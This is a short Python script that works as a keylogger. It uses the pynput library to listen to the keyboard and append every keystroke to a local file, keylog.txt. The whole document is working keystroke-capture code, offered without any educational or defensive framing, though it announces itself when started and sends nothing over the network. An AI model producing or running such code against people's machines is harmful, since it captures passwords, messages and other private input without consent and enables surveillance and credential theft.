from pynput.keyboard import Key, Listener

def on_press(key):
    with open("keylog.txt", "a") as log:
        log.write(f"{key}\n")

if __name__ == "__main__":
    print("Starting keylogger... Press Ctrl+C to stop.")
    with Listener(on_press=on_press) as listener:
        listener.join()

